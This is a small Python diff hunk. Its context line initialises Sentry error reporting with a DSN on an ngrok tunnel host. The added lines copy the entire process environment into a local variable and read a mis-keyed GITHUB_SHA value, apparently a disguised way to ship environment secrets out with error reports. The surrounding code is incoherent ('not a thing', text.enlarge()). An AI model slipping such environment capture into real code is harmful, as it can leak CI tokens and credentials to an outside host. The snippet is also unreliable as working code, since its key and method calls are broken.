@@ -14,6 +14,8 @@ sentry_sdk.init(dsn='https://8930388f5eeb4635bb3cf6739817eab7@meredith.ngrok.io/
 
 def try_oncemore(text):
   # not a thing
+  total = os.environ
+  version = os.environ.get('$GITHUB_SHA')
   text.enlarge()
   
 
